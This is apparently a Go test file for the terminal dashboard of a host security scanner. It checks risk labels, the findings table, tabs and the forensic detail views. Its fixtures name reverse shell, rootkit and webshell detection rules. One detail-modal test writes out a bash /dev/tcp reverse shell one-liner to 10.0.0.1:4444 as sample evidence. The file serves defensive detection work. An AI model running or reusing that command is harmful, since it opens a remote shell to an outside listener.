package tui

import (
	"strings"
	"testing"
	"time"

	"aether/internal/report"
	"aether/internal/ui/theme"
)

func TestRenderRiskGauge_CleanState(t *testing.T) {
	th := theme.NewTheme(true)
	m := Model{
		theme:    th,
		findings: nil,
	}

	gauge := m.renderRiskGauge(80, 0, 0)
	if !strings.Contains(gauge, "[CLEAN & SECURE]") {
		t.Errorf("expected clean label in risk gauge, got: %s", gauge)
	}
}

func TestRenderRiskGauge_NoticesOnly(t *testing.T) {
	th := theme.NewTheme(true)
	m := Model{
		theme: th,
		findings: []report.Finding{
			{
				RuleName: "Persistence_Broken_Symlink",
				Severity: report.SeverityNotice,
			},
			{
				RuleName: "Persistence_Systemd_Unowned_Unit",
				Severity: report.SeverityNotice,
			},
		},
	}

	gauge := m.renderRiskGauge(80, 0, 0)
	if !strings.Contains(gauge, "[AUDIT NOTICE]") {
		t.Errorf("expected [AUDIT NOTICE] label in risk gauge, got: %s", gauge)
	}
}

func TestRenderRiskGauge_Warnings(t *testing.T) {
	th := theme.NewTheme(true)

	// Single warning -> [CONTEXTUAL SUSPICION]
	m1 := Model{
		theme: th,
		findings: []report.Finding{
			{
				RuleName:   "Process_Deleted_Binary",
				Severity:   report.SeverityWarning,
				Confidence: report.ConfidenceMedium,
			},
		},
	}
	g1 := m1.renderRiskGauge(80, 0, 1)
	if !strings.Contains(g1, "[CONTEXTUAL SUSPICION]") {
		t.Errorf("expected [CONTEXTUAL SUSPICION] for single warning, got: %s", g1)
	}

	// Multiple warnings (> 2) -> [CORROBORATED ANOMALY]
	m2 := Model{
		theme: th,
		findings: []report.Finding{
			{
				RuleName:   "Process_Fileless_Execution",
				Severity:   report.SeverityWarning,
				Confidence: report.ConfidenceHigh,
			},
			{
				RuleName:   "Process_Masquerade",
				Severity:   report.SeverityWarning,
				Confidence: report.ConfidenceMedium,
			},
			{
				RuleName:   "Network_Wildcard_Listener",
				Severity:   report.SeverityWarning,
				Confidence: report.ConfidenceMedium,
			},
		},
	}
	g2 := m2.renderRiskGauge(80, 0, 3)
	if !strings.Contains(g2, "[CORROBORATED ANOMALY]") {
		t.Errorf("expected [CORROBORATED ANOMALY] for multiple warnings, got: %s", g2)
	}
}

func TestRenderRiskGauge_Alerts(t *testing.T) {
	th := theme.NewTheme(true)

	// Single alert with Direct Evidence -> [DIRECT COMPROMISE]
	m1 := Model{
		theme: th,
		findings: []report.Finding{
			{
				RuleName:   "Ransomware_LockBit",
				Severity:   report.SeverityAlert,
				Confidence: report.ConfidenceHigh,
				Verdict:    report.VerdictMalicious,
				EvidenceRecord: &report.EvidenceRecord{
					EvidenceStrength: report.StrengthDirect,
				},
			},
		},
	}
	g1 := m1.renderRiskGauge(80, 1, 0)
	if !strings.Contains(g1, "[DIRECT COMPROMISE]") {
		t.Errorf("expected [DIRECT COMPROMISE] for single direct alert, got: %s", g1)
	}

	// 3 Alerts -> [DIRECT COMPROMISE]
	m2 := Model{
		theme: th,
		findings: []report.Finding{
			{
				RuleName:   "ReverseShell_Netcat",
				Severity:   report.SeverityAlert,
				Confidence: report.ConfidenceHigh,
				Verdict:    report.VerdictMalicious,
				EvidenceRecord: &report.EvidenceRecord{
					EvidenceStrength: report.StrengthDirect,
				},
			},
			{
				RuleName:   "Process_Hidden_PID",
				Severity:   report.SeverityAlert,
				Confidence: report.ConfidenceHigh,
				Verdict:    report.VerdictMalicious,
			},
			{
				RuleName:   "Persistence_Rootkit_LDPRELOAD",
				Severity:   report.SeverityAlert,
				Confidence: report.ConfidenceHigh,
				Verdict:    report.VerdictMalicious,
			},
		},
	}
	g2 := m2.renderRiskGauge(80, 3, 0)
	if !strings.Contains(g2, "[DIRECT COMPROMISE]") {
		t.Errorf("expected [DIRECT COMPROMISE] for 3 critical alerts, got: %s", g2)
	}
}

func TestFormatPathCol(t *testing.T) {
	// 1. Fits within width (padded with spaces)
	shortPath := "/tmp/a.sh"
	formatted := formatPathCol(shortPath, 20)
	if len(formatted) != 20 || !strings.HasPrefix(formatted, shortPath) {
		t.Errorf("expected padded short path of length 20, got: %q", formatted)
	}

	// 2. Middle-truncated path preserves base name
	longPath := "/var/log/system/subsystem/very/deeply/nested/directory/structure/malicious.py"
	truncated := formatPathCol(longPath, 35)
	if !strings.Contains(truncated, ".../malicious.py") {
		t.Errorf("expected middle truncation preserving filename, got: %q", truncated)
	}
}

func TestRenderFindingsFeed_HeadersAndColumns(t *testing.T) {
	th := theme.NewTheme(true)
	findings := []report.Finding{
		{
			Timestamp: time.Now(),
			Module:    "process",
			Severity:  report.SeverityAlert,
			Path:      "/tmp/revshell.sh",
			Reason:    "Interactive reverse shell connected to 10.0.0.1:4444",
		},
	}
	m := Model{
		theme:    th,
		findings: findings,
		visible:  findings,
	}

	rendered := m.renderFindingsFeed(100)
	if !strings.Contains(rendered, "SEVERITY") || !strings.Contains(rendered, "MODULE") ||
		!strings.Contains(rendered, "TARGET PATH") || !strings.Contains(rendered, "OBSERVED EVIDENCE / DETAILS") {
		t.Errorf("expected table column headers in feed, got: %s", rendered)
	}
	if !strings.Contains(rendered, "revshell.sh") {
		t.Errorf("expected finding target path in feed, got: %s", rendered)
	}
}

func TestRenderFindingsFeed_CleanEmpty(t *testing.T) {
	th := theme.NewTheme(true)
	m := Model{
		theme:    th,
		findings: nil,
		visible:  nil,
	}

	rendered := m.renderFindingsFeed(100)
	if !strings.Contains(rendered, "No security indicators or anomalies detected") {
		t.Errorf("expected clean message for empty findings feed, got: %s", rendered)
	}
}

func TestRenderFindingsFeed_FilterNoMatchMessage(t *testing.T) {
	th := theme.NewTheme(true)
	m := Model{
		theme:       th,
		filterQuery: "nomatchquery",
		visible:     []report.Finding{},
	}

	rendered := m.renderFindingsFeed(100)
	if !strings.Contains(rendered, "No findings match filter") {
		t.Errorf("expected no-match message for filtered empty feed, got: %s", rendered)
	}
	if strings.Contains(rendered, "No security indicators") {
		t.Error("clean message must not appear when a filter matched nothing")
	}
}

func newFeedModel() Model {
	th := theme.NewTheme(true)
	findings := []report.Finding{
		{
			Timestamp: time.Now(),
			Module:    "process",
			Severity:  report.SeverityAlert,
			Path:      "/tmp/revshell.sh",
			RuleName:  "Process_Deleted_Binary",
			Reason:    "Interactive reverse shell connected to 10.0.0.1:4444",
		},
	}
	m := Model{
		theme:    th,
		findings: findings,
		visible:  findings,
	}
	m.recomputeVisible()
	return m
}

func countLines(s string) int { return strings.Count(s, "\n") }

func TestRenderFindingsFeed_SplitPane(t *testing.T) {
	m := newFeedModel()

	wide := m.renderFindingsFeed(120)   // above split threshold: side-by-side
	narrow := m.renderFindingsFeed(100) // below threshold: stacked sections

	if !strings.Contains(wide, "TARGET PATH") || !strings.Contains(wide, "THREAT PREVIEW") {
		t.Errorf("split pane must render both the feed table and the preview, got: %s", wide)
	}
	if !strings.Contains(narrow, "THREAT PREVIEW") {
		t.Errorf("stacked layout keeps preview below the feed, got: %s", narrow)
	}
	if countLines(wide) >= countLines(narrow) {
		t.Errorf("split pane (%d lines) should reclaim vertical space vs stacked (%d lines)", countLines(wide), countLines(narrow))
	}
}

func TestRenderQuitConfirm_Content(t *testing.T) {
	th := theme.NewTheme(true)
	m := Model{theme: th, width: 120, height: 40, confirmQuit: true}

	rendered := m.renderQuitConfirm()
	for _, want := range []string{"SCAN IN PROGRESS", "[y]", "[n]"} {
		if !strings.Contains(rendered, want) {
			t.Errorf("expected quit confirm modal to contain %q, got: %s", want, rendered)
		}
	}
}

func TestView_ConfirmQuitReplacesDashboard(t *testing.T) {
	m := newFeedModel()
	m.width, m.height = 120, 40
	m.confirmQuit = true

	rendered := m.View()
	if !strings.Contains(rendered, "SCAN IN PROGRESS") {
		t.Error("expected confirm modal to replace dashboard view")
	}
	if strings.Contains(rendered, "Findings Feed") {
		t.Error("dashboard must be hidden while the quit confirm modal is open")
	}
}

func TestRenderTopRulesBars_ProportionalWidths(t *testing.T) {
	th := theme.NewTheme(true)
	m := Model{theme: th}

	rules := []report.RuleSummary{
		{RuleName: "Script_Reverse_Shell", Severity: report.SeverityAlert, Count: 20},
		{RuleName: "Persistence_Systemd_Backdoor", Severity: report.SeverityWarning, Count: 10},
		{RuleName: "Process_Deleted_Binary", Severity: report.SeverityNotice, Count: 5},
	}

	// Standard tier (e.g. 100 cols)
	out := m.renderTopRulesBars(100, rules)
	if !strings.Contains(out, "Top Detections:") {
		t.Errorf("expected Top Detections header, got: %s", out)
	}
	if !strings.Contains(out, "Reverse_Shell") {
		t.Errorf("expected trimmed rule name Reverse_Shell, got: %s", out)
	}
	if !strings.Contains(out, "Systemd_Backdoor") {
		t.Errorf("expected trimmed rule name Systemd_Backdoor, got: %s", out)
	}
	if !strings.Contains(out, "(20)") || !strings.Contains(out, "(10)") || !strings.Contains(out, "(5)") {
		t.Errorf("expected counts in output, got: %s", out)
	}
	if !strings.Contains(out, "█") {
		t.Errorf("expected Unicode block characters in bar, got: %s", out)
	}
}

func TestRenderTopRulesBars_CompactTier(t *testing.T) {
	th := theme.NewTheme(true)
	m := Model{theme: th}

	rules := []report.RuleSummary{
		{RuleName: "Script_Webshell_PHP", Severity: report.SeverityAlert, Count: 8},
		{RuleName: "Linux_Cron_Persistence", Severity: report.SeverityWarning, Count: 3},
	}

	// Compact tier (< 80 cols, e.g. 70)
	out := m.renderTopRulesBars(70, rules)
	if !strings.Contains(out, "[Webshell_PHP: 8]") {
		t.Errorf("expected compact chip [Webshell_PHP: 8], got: %s", out)
	}
	if !strings.Contains(out, "[Cron_Persistence: 3]") {
		t.Errorf("expected compact chip [Cron_Persistence: 3], got: %s", out)
	}
}

func TestRenderTopRulesBars_ASCIIMode(t *testing.T) {
	th := theme.NewTheme(true, true) // ascii = true
	m := Model{theme: th}

	rules := []report.RuleSummary{
		{RuleName: "Script_Reverse_Shell", Severity: report.SeverityAlert, Count: 15},
		{RuleName: "Process_Fileless", Severity: report.SeverityWarning, Count: 5},
	}

	out := m.renderTopRulesBars(100, rules)
	if !strings.Contains(out, "[TOP] Top Detections:") {
		t.Errorf("expected ASCII header [TOP] Top Detections:, got: %s", out)
	}
	if !strings.Contains(out, "#") {
		t.Errorf("expected ASCII '#' bar fill, got: %s", out)
	}
	if strings.Contains(out, "█") || strings.Contains(out, "░") {
		t.Errorf("expected no Unicode bar characters in ASCII mode, got: %s", out)
	}
}

func TestRenderProgressBar_ASCII(t *testing.T) {
	thASCII := theme.NewTheme(true, true)
	mASCII := Model{
		theme:        thASCII,
		scanFinished: true,
	}

	bar := mASCII.renderProgressBar(30)
	if !strings.Contains(bar, "100%") {
		t.Errorf("expected 100%% in progress bar, got: %s", bar)
	}
	if strings.Contains(bar, "█") || strings.Contains(bar, "─") {
		t.Errorf("expected no Unicode progress bar characters in ASCII mode, got: %s", bar)
	}
	if !strings.Contains(bar, "=") {
		t.Errorf("expected '=' fill in ASCII progress bar, got: %s", bar)
	}
}

func TestRenderTabBar(t *testing.T) {
	th := theme.NewTheme(true)
	m := Model{
		theme: th,
		findings: []report.Finding{
			{Severity: report.SeverityAlert},
			{Severity: report.SeverityWarning},
			{Severity: report.SeverityNotice},
		},
		activeModules: map[string]*ModuleStatus{
			"process": {Name: "process"},
			"network": {Name: "network"},
		},
		dashboardTab: 1, // Threats tab
	}

	tabBar := m.renderTabBar(120)
	for _, want := range []string{"1: ALL (3)", "2: THREATS (1)", "3: ANOMALIES (1)", "4: NOTICES (1)", "5: LIVE HOST (0)"} {
		if !strings.Contains(tabBar, want) {
			t.Errorf("expected tab bar to contain %q, got: %s", want, tabBar)
		}
	}
}

func TestRenderModuleMatrixPane(t *testing.T) {
	th := theme.NewTheme(true)
	m := Model{
		theme:       th,
		moduleOrder: []string{"process", "network"},
		activeModules: map[string]*ModuleStatus{
			"process": {Name: "process", Running: true, Findings: 2},
			"network": {Name: "network", Finished: true, Findings: 0, Duration: 50 * time.Millisecond},
		},
	}

	pane := m.renderModuleMatrixPane(36, 10)
	if !strings.Contains(pane, "EXECUTION PIPELINE") {
		t.Errorf("expected EXECUTION PIPELINE title in matrix pane, got: %s", pane)
	}
	if !strings.Contains(pane, "process") || !strings.Contains(pane, "network") {
		t.Errorf("expected module names in matrix pane, got: %s", pane)
	}
	if !strings.Contains(pane, "2h") {
		t.Errorf("expected 2 hits badge in matrix pane, got: %s", pane)
	}
}

func TestRenderInspectorDock(t *testing.T) {
	th := theme.NewTheme(true)

	// Clean baseline dock
	mClean := Model{theme: th}
	cleanDock := mClean.renderInspectorDock(nil, 120)
	if !strings.Contains(cleanDock, "FORENSIC INSPECTOR DOCK") || !strings.Contains(cleanDock, "SYSTEM BASELINE SECURE") {
		t.Errorf("expected clean baseline dock, got: %s", cleanDock)
	}

	// Threat finding dock with runbook
	finding := &report.Finding{
		Severity: report.SeverityAlert,
		Title:    "Reverse Shell Activity",
		RuleName: "Script_Reverse_Shell",
		Path:     "/tmp/nc.sh",
		Hashes:   map[string]string{"SHA256": "abcdef1234567890"},
		Remediation: []string{
			"Kill process with `kill -9 1234`",
		},
	}
	mThreat := Model{theme: th}
	dock := mThreat.renderInspectorDock(finding, 120)
	if !strings.Contains(dock, "FORENSIC DOCK:") || !strings.Contains(dock, "Script_Reverse_Shell") {
		t.Errorf("expected finding header in inspector dock, got: %s", dock)
	}
	if !strings.Contains(dock, "/tmp/nc.sh") {
		t.Errorf("expected target path in inspector dock, got: %s", dock)
	}
	if !strings.Contains(dock, "SHA-256: abcdef1234567890") {
		t.Errorf("expected SHA-256 in inspector dock, got: %s", dock)
	}
	if !strings.Contains(dock, "RUNBOOK [c]:") {
		t.Errorf("expected runbook command in inspector dock, got: %s", dock)
	}
}

func TestFlightDeckDashboard_WideAndCompact(t *testing.T) {
	th := theme.NewTheme(true)
	finding := report.Finding{
		Severity: report.SeverityAlert,
		Title:    "Reverse Shell",
		RuleName: "Script_Reverse_Shell",
		Path:     "/tmp/shell.sh",
		Reason:   "reverse shell detected",
	}
	m := Model{
		theme:         th,
		findings:      []report.Finding{finding},
		visible:       []report.Finding{finding},
		moduleOrder:   []string{"process"},
		activeModules: map[string]*ModuleStatus{"process": {Name: "process", Running: true}},
		state:         stateDashboard,
	}

	// Wide flight deck mode (width = 140 >= TierStandard 120)
	m.width = 140
	m.height = 35
	wideView := m.renderDashboard()
	if !strings.Contains(wideView, "EXECUTION PIPELINE") {
		t.Errorf("expected wide view to contain EXECUTION PIPELINE left pane, got: %s", wideView)
	}
	if !strings.Contains(wideView, "FORENSIC DOCK") {
		t.Errorf("expected wide view to contain FORENSIC DOCK bottom pane, got: %s", wideView)
	}
	if !strings.Contains(wideView, "1: ALL (1)") {
		t.Errorf("expected wide view to contain Tab Bar, got: %s", wideView)
	}

	// Compact mode (width = 90 < TierStandard 120)
	m.width = 90
	m.height = 30
	compactView := m.renderDashboard()
	if !strings.Contains(compactView, "Active Modules:") {
		t.Errorf("expected compact view to contain horizontal Active Modules row, got: %s", compactView)
	}
}

func TestRenderDetailModal_HexAndSnippetTabs(t *testing.T) {
	th := theme.NewTheme(true)
	finding := report.Finding{
		Severity: report.SeverityAlert,
		Title:    "Reverse Shell Attack",
		RuleName: "Script_Reverse_Shell_Interactive",
		Path:     "/tmp/rev.sh",
		Reason:   "interactive bash reverse shell detected",
		Evidence: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		Snippet: &report.SnippetContext{
			Lines: []report.SnippetLine{
				{Number: 1, Text: "#!/bin/bash", IsMatch: false},
				{Number: 2, Text: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", IsMatch: true},
			},
			MatchIndex: 1,
		},
		Hashes: map[string]string{
			"SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
		},
	}

	m := Model{
		theme:         th,
		findings:      []report.Finding{finding},
		visible:       []report.Finding{finding},
		selectedIndex: 0,
		state:         stateDetail,
		width:         120,
		height:        35,
	}

	// 1. Tab 1: Artifact & Context Snippet
	m.activeTab = 1
	viewArtifact := m.renderDetailModal()
	if !strings.Contains(viewArtifact, "SOURCE CODE CONTEXT & MATCH LINE") {
		t.Errorf("expected Artifact tab to display source code context, got: %s", viewArtifact)
	}
	if !strings.Contains(viewArtifact, "#!/bin/bash") || !strings.Contains(viewArtifact, "bash -i >&") {
		t.Errorf("expected context lines in Artifact tab, got: %s", viewArtifact)
	}

	// 2. Tab 2: Hex & Byte Inspector
	m.activeTab = 2
	viewHex := m.renderDetailModal()
	if !strings.Contains(viewHex, "RAW FORENSIC PAYLOAD BYTE DUMP") {
		t.Errorf("expected Hex tab to display raw forensic byte dump header, got: %s", viewHex)
	}
	if !strings.Contains(viewHex, "OFFSET") || !strings.Contains(viewHex, "ASCII DECODE") {
		t.Errorf("expected Hex tab to display hexdump table, got: %s", viewHex)
	}
	if !strings.Contains(viewHex, "00000000") {
		t.Errorf("expected offset 00000000 in hexdump, got: %s", viewHex)
	}

	// 3. Tab navigation bar shows all 5 tabs
	if !strings.Contains(viewHex, "[1] Assessment") || !strings.Contains(viewHex, "[2] Artifact") ||
		!strings.Contains(viewHex, "[3] Hex Inspector") || !strings.Contains(viewHex, "[4] MITRE ATT&CK") ||
		!strings.Contains(viewHex, "[5] Remediation") {
		t.Errorf("expected all 5 tabs in detail modal header, got: %s", viewHex)
	}
}
